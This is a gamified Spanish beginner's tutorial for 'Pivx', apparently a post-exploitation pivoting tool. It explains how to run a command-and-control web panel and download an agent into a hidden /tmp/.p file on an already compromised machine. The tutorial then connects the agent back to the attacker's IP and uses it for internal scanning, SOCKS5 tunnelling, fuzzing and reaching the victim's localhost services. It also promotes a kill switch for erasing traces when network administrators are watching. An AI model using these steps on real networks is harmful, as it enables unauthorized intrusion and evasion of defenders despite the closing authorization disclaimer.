[English](TUTORIAL.md) | [Español](TUTORIAL_es.md) | [Português](TUTORIAL_pt.md) | [中文](TUTORIAL_zh.md)

[← Volver al README](../README.md)

# 🎮 Guía Rápida: Pivx para Principiantes

## ¿Qué es Pivx?

Imagina que la red que quieres investigar es un **castillo cerrado y custodiado**. Pivx es un **portal mágico e invisible**. En lugar de pelear con configuraciones de red difíciles, levantas un "Centro de Mando" visual en tu computadora y envías a un "Agente" adentro del castillo. Cuando ambos se conectan, puedes usar todas tus herramientas desde afuera como si estuvieras sentado físicamente adentro.

---

## 🚀 Paso 1: Tu Centro de Mando

Primero, vamos a encender tu base de operaciones segura.

- Abre tu consola de atacante y escribe el comando de inicio:

```bash
sudo server/venv/bin/streamlit run server/app.py
```

- Abre tu navegador de internet favorito y visita la dirección web: **http://localhost:8501**
- Observa tu nuevo panel de control web, desde donde manejarás todas tus rutas y conexiones con simples clics.

---

## 🕵️‍♂️ Paso 2: El Agente Secreto

Ahora necesitamos que nuestro infiltrado nos abra la puerta desde adentro del castillo.

- Lleva el archivo `pivx-agent-linux-amd64` hacia la computadora que ya lograste controlar:

```bash
wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
chmod +x /tmp/.p
```

- Enciende al agente diciéndole dónde está tu base:

```bash
/tmp/.p --server ws://<TU_IP_ATACANTE>:8765
```

- Vuelve a tu panel web y celebra al ver que tu agente secreto ha aparecido en la tabla como **"online"**. 🎉

---

## 🪄 Paso 3: Tus Superpoderes

Con el portal abierto, ya tienes habilitados tus trucos especiales directamente desde tu máquina.

### 🛡️ El Radar (Smartping)

Escribe comandos normales como `ping` o lanza escaneos rápidos hacia las máquinas del castillo; el agente responderá por ellas.

```bash
ping 10.10.20.100
nmap -sn 10.10.20.0/24
```

### 🎭 El Disfraz (SOCKS5)

Activa el interruptor **"Start SOCKS5"** en tu panel web para abrir un túnel seguro en tu puerto **1080** local.

```bash
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/
```

### 🔍 La Lupa Infiltrada

Configura herramientas como Burp Suite, ffuf o proxychains para que apunten a `127.0.0.1:1080` y analicen todo el castillo.

```bash
proxychains -q nmap -sT -Pn -p 80,443 10.10.20.100
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
```

### 🪞 El Espejo (Magic IP)

Si quieres revisar qué programas secretos oculta tu víctima en su propio equipo, simplemente busca `http://240.0.0.1` desde tu navegador o herramientas:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/
```

La dirección mágica `240.0.0.1` se traduce automáticamente al `127.0.0.1` del agente.

### 🔴 El Botón de Pánico (Kill Switch)

Si notas que los administradores de la red te están rastreando, presiona el botón rojo **"Kill"** en tu panel para que el agente se destruya instantáneamente. Sin rastros, sin archivos residuales.

---

> ⚠️ **Usar únicamente en sistemas propios o con autorización explícita por escrito.**
